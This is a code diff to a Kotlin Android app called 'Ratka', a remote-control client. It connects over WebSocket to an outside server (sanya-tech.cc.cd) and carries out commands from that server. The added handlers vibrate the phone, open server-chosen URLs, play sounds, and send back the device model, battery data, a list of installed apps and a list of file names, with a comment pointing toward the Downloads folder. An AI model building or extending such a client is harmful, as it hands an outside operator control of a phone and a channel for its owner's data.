@@ -1,16 +1,26 @@
 package com.ratka.client
 
 import android.content.Context
+import android.content.Intent
+import android.media.AudioManager
+import android.media.RingtoneManager
+import android.net.Uri
 import android.os.BatteryManager
+import android.os.Build
 import android.os.Bundle
+import android.os.VibrationEffect
+import android.os.Vibrator
 import android.util.Log
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.TextView
+import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import okhttp3.*
+import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
+import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
     private val client = OkHttpClient.Builder()
@@ -18,23 +28,19 @@ class MainActivity : AppCompatActivity() {
         .build()
     private var webSocket: WebSocket? = null
     private var statusText: TextView? = null
-
     private val wsUrl = "wss://sanya-tech.cc.cd/socket.io/?EIO=4&transport=websocket"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        
         val layout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             setPadding(32, 32, 32, 32)
         }
-        
         statusText = TextView(this).apply { text = "Ожидание подключения..." }
         val btnConnect = Button(this).apply {
-            text = "Подключиться"
+            text = "Подключиться к Ратке"
             setOnClickListener { connectWebSocket() }
         }
-        
         layout.addView(statusText)
         layout.addView(btnConnect)
         setContentView(layout)
@@ -47,33 +53,88 @@ class MainActivity : AppCompatActivity() {
                 runOnUiThread { statusText?.text = "Подключено к Ратке" }
                 val hello = JSONObject().apply {
                     put("type", "connect")
-                    put("device", android.os.Build.MODEL)
+                    put("device_type", "android")
+                    put("model", Build.MODEL)
                 }
                 webSocket.send(hello.toString())
-                sendBatteryInfo()
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
                 Log.d("RATKA", "Получено: $text")
                 try {
                     val json = JSONObject(text)
-                    if (json.optString("cmd") == "battery") {
-                        sendBatteryInfo()
+                    when (json.optString("cmd")) {
+                        "battery" -> sendBatteryInfo(webSocket)
+                        "vibrate" -> vibratePhone()
+                        "toast" -> showToast(json.optString("text", "Привет от Ратки!"))
+                        "open_url" -> openUrl(json.optString("url", "https://google.com"))
+                        "sound" -> playSound()
+                        "apps" -> sendInstalledApps(webSocket)
+                        "files" -> sendDownloads(webSocket)
                     }
                 } catch (e: Exception) {
-                    Log.e("RATKA", "Ошибка парсинга", e)
+                    Log.e("RATKA", "Ошибка", e)
                 }
             }
         })
     }
 
-    private fun sendBatteryInfo() {
+    private fun sendBatteryInfo(ws: WebSocket) {
         val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
         val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-        val json = JSONObject().apply {
+        val temp = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_TEMPERATURE) / 10.0
+        val status = if (bm.isCharging) "Заряжается" else "От батареи"
+        ws.send(JSONObject().apply {
             put("type", "battery")
             put("level", level)
+            put("temp", temp)
+            put("status", status)
+        }.toString())
+    }
+
+    private fun vibratePhone() {
+        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            vibrator.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE))
+        } else {
+            @Suppress("DEPRECATION")
+            vibrator.vibrate(2000)
         }
-        webSocket?.send(json.toString())
+        runOnUiThread { statusText?.text = "Вибрация 2 секунды" }
+    }
+
+    private fun showToast(text: String) {
+        runOnUiThread { Toast.makeText(this, text, Toast.LENGTH_LONG).show() }
+    }
+
+    private fun openUrl(url: String) {
+        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
+        startActivity(intent)
+        runOnUiThread { statusText?.text = "Открыта ссылка: $url" }
+    }
+
+    private fun playSound() {
+        val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
+        val ringtone = RingtoneManager.getRingtone(applicationContext, uri)
+        ringtone.play()
+        runOnUiThread { statusText?.text = "Проигран звук" }
+    }
+
+    private fun sendInstalledApps(ws: WebSocket) {
+        val pm = packageManager
+        val apps = pm.getInstalledApplications(0).map { it.packageName }.filter { !it.startsWith("android.") }
+        ws.send(JSONObject().apply {
+            put("type", "apps")
+            put("list", JSONArray(apps.take(30))) // первые 30 штук
+        }.toString())
+    }
+
+    private fun sendDownloads(ws: WebSocket) {
+        val dir = getExternalFilesDir(null) // или Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
+        val files = dir?.listFiles()?.map { it.name } ?: emptyList()
+        ws.send(JSONObject().apply {
+            put("type", "files")
+            put("list", JSONArray(files))
+        }.toString())
     }
 }
